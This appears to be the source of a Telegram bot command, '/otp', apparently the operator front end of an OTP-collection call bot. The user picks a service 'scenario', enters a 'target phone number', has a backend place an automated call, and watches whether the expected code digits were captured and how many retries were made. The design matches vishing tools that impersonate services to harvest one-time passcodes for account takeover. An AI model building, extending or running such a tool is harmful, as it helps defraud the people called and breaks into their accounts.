/**
 * Telegram Bot OTP Command
 * 
 * Usage: /otp - Interactive menu to initiate OTP collection calls
 * 
 * Flow:
 * 1. List available OTP scenarios
 * 2. Select scenario
 * 3. Enter phone number
 * 4. Confirm and initiate call
 * 5. Monitor call status
 */

const axios = require('axios');
const { InlineKeyboard } = require('grammy');
const config = require('../config');

module.exports = {
  command: 'otp',
  aliases: ['credential', 'verification'],
  description: 'Initiate OTP/credential verification calls',
  
  handler: async (ctx) => {
    try {
      // Check authorization
      if (!ctx.session || !ctx.session.userId) {
        return ctx.reply('❌ Unauthorized. Please use /start to initialize your session.');
      }

      // Fetch available OTP scenarios from API
      let scenarios;
      try {
        const scenariosRes = await axios.get(
          `${config.apiUrl}/otp/scenarios`,
          {
            headers: {
              'Authorization': `Bearer ${config.admin.apiToken}`
            }
          }
        );
        scenarios = scenariosRes.data.scenarios || [];
      } catch (error) {
        console.error('Failed to fetch OTP scenarios:', error.message);
        return ctx.reply('❌ Failed to load OTP scenarios. Try again later.');
      }

      if (!scenarios || scenarios.length === 0) {
        return ctx.reply('❌ No OTP scenarios available.');
      }

      // Build inline keyboard with scenario options
      const keyboard = new InlineKeyboard();
      scenarios.forEach((scenario) => {
        keyboard.text(
          `${scenario.name} (${scenario.digits} digits)`,
          `otp_select:${scenario.key}`
        );
      });
      keyboard.text('❌ Cancel', 'otp_cancel');

      return ctx.reply(
        '📞 <b>OTP Verification System</b>\n\n' +
        'Select the verification scenario:\n\n' +
        scenarios.map(s => `• <b>${s.name}</b>: ${s.description}`).join('\n'),
        {
          parse_mode: 'HTML',
          reply_markup: keyboard
        }
      );

    } catch (error) {
      console.error('OTP command error:', error);
      ctx.reply('❌ Error loading OTP menu.');
    }
  },

  // Callback handlers for scenario selection
  callbackHandlers: {
    'otp_select': async (ctx, scenarioKey) => {
      try {
        // Store selected scenario in session
        ctx.session.otpScenario = scenarioKey;

        // Prompt for phone number
        const keyboard = new InlineKeyboard()
          .text('❌ Cancel', 'otp_cancel');

        return ctx.editMessageText(
          '📱 <b>Enter Phone Number</b>\n\n' +
          'Please enter the target phone number for the OTP call:\n\n' +
          '<i>Format: +1234567890 or 8-14 digits</i>',
          {
            parse_mode: 'HTML',
            reply_markup: keyboard
          }
        );
      } catch (error) {
        console.error('Scenario selection error:', error);
        return ctx.answerCallbackQuery('❌ Error selecting scenario');
      }
    },

    'otp_cancel': async (ctx) => {
      ctx.session.otpScenario = null;
      ctx.session.otpPhoneNumber = null;
      return ctx.editMessageText('❌ OTP call cancelled.', { reply_markup: null });
    },

    'otp_confirm': async (ctx) => {
      try {
        const scenario = ctx.session.otpScenario;
        const phoneNumber = ctx.session.otpPhoneNumber;

        if (!scenario || !phoneNumber) {
          return ctx.answerCallbackQuery('❌ Missing scenario or phone number');
        }

        // Show loading state
        await ctx.editMessageText('⏳ Initiating OTP call...', { reply_markup: null });

        // Call API to initiate OTP call
        const response = await axios.post(
          `${config.apiUrl}/otp/initiate`,
          {
            service: scenario,
            to: phoneNumber,
            userId: ctx.from.id,
            businessId: ctx.session.businessId || null,
            userName: ctx.from.first_name || 'User',
            metadata: {
              telegram_user_id: ctx.from.id,
              telegram_username: ctx.from.username,
              initiated_at: new Date().toISOString()
            }
          },
          {
            headers: {
              'Authorization': `Bearer ${config.admin.apiToken}`
            }
          }
        );

        if (!response.data.success) {
          return ctx.editMessageText(
            `❌ Failed to initiate call: ${response.data.error || 'Unknown error'}`,
            { reply_markup: null }
          );
        }

        const callSid = response.data.callSid;
        const serviceInfo = response.data.scenario;

        // Store call info for tracking
        ctx.session.otpCall = {
          callSid,
          service: scenario,
          phoneNumber,
          status: 'ringing',
          initiatedAt: new Date().toISOString()
        };

        // Build status keyboard
        const statusKeyboard = new InlineKeyboard()
          .text('🔄 Refresh Status', `otp_status:${callSid}`)
          .text('❌ Cancel Call', `otp_hangup:${callSid}`);

        return ctx.editMessageText(
          '✅ <b>OTP Call Initiated</b>\n\n' +
          `<b>Call ID:</b> <code>${callSid}</code>\n` +
          `<b>Service:</b> ${response.data.serviceName}\n` +
          `<b>Phone:</b> ${phoneNumber}\n` +
          `<b>Expected Digits:</b> ${serviceInfo.expectedDigits}\n` +
          `<b>Max Retries:</b> ${serviceInfo.maxRetries}\n\n` +
          '<i>Call ringing... Waiting for connection...</i>',
          {
            parse_mode: 'HTML',
            reply_markup: statusKeyboard
          }
        );

      } catch (error) {
        console.error('OTP confirmation error:', error);
        return ctx.editMessageText(
          `❌ Error initiating call: ${error.response?.data?.error || error.message}`,
          { reply_markup: null }
        );
      }
    },

    'otp_status': async (ctx, callSid) => {
      try {
        // Fetch call status from API
        const statusRes = await axios.get(
          `${config.apiUrl}/otp/status/${callSid}`,
          {
            headers: {
              'Authorization': `Bearer ${config.admin.apiToken}`
            }
          }
        );

        const call = statusRes.data.call;
        const stats = statusRes.data.stats;

        const statusEmoji = {
          'initiated': '⏳',
          'ringing': '📞',
          'in-progress': '🎤',
          'completed': '✅',
          'failed': '❌',
          'no-answer': '⏰',
          'max-retries': '⚠️'
        };

        const emoji = statusEmoji[call.status] || '❓';

        // Build status keyboard
        const statusKeyboard = new InlineKeyboard()
          .text('🔄 Refresh', `otp_status:${callSid}`)
          .text('❌ Hangup', `otp_hangup:${callSid}`);

        return ctx.editMessageText(
          `${emoji} <b>OTP Call Status</b>\n\n` +
          `<b>Call ID:</b> <code>${callSid}</code>\n` +
          `<b>Service:</b> ${call.service.toUpperCase()}\n` +
          `<b>Phone:</b> ${call.phone_number}\n` +
          `<b>Status:</b> ${call.status.toUpperCase()}\n` +
          `<b>Attempts:</b> ${stats.attempts}/${stats.success ? '✓ Successful' : 'Pending'}\n` +
          `<b>Duration:</b> ${(stats.duration / 1000).toFixed(1)}s\n` +
          `<b>Started:</b> ${new Date(stats.timestamp.started).toLocaleTimeString()}\n` +
          (stats.timestamp.completed ? `<b>Completed:</b> ${new Date(stats.timestamp.completed).toLocaleTimeString()}\n` : '') +
          `\n${stats.success ? '✅ Call completed successfully!' : '⏳ Call in progress...'}`,
          {
            parse_mode: 'HTML',
            reply_markup: statusKeyboard
          }
        );

      } catch (error) {
        console.error('Status fetch error:', error);
        return ctx.answerCallbackQuery('❌ Failed to fetch call status');
      }
    },

    'otp_hangup': async (ctx, callSid) => {
      try {
        // In production, you'd call an API endpoint to hangup
        // For now, just update the UI
        return ctx.editMessageText(
          '❌ OTP call termination requested.\n\n' +
          'Note: Actual hangup implementation depends on your provider.',
          { reply_markup: null }
        );
      } catch (error) {
        console.error('Hangup error:', error);
        return ctx.answerCallbackQuery('❌ Error terminating call');
      }
    }
  },

  // Handle text input for phone number
  messageHandler: async (ctx) => {
    if (ctx.session?.otpScenario && !ctx.session?.otpPhoneNumber) {
      const phoneInput = ctx.message.text;

      // Validate phone format
      const phoneRegex = /^\+?(\d{8,14})$/;
      if (!phoneRegex.test(phoneInput.replace(/\s/g, ''))) {
        return ctx.reply(
          '❌ Invalid phone number format.\n\n' +
          'Please enter 8-14 digits or +country code format.\n\n' +
          'Example: +1234567890 or 1234567890'
        );
      }

      // Store phone number
      ctx.session.otpPhoneNumber = phoneInput;

      // Build confirmation keyboard
      const confirmKeyboard = new InlineKeyboard()
        .text('✅ Confirm & Call', 'otp_confirm')
        .text('❌ Cancel', 'otp_cancel');

      return ctx.reply(
        `📋 <b>Confirm OTP Call</b>\n\n` +
        `<b>Scenario:</b> ${ctx.session.otpScenario}\n` +
        `<b>Phone:</b> ${phoneInput}\n\n` +
        'Ready to initiate the call?',
        {
          parse_mode: 'HTML',
          reply_markup: confirmKeyboard
        }
      );
    }
  }
};
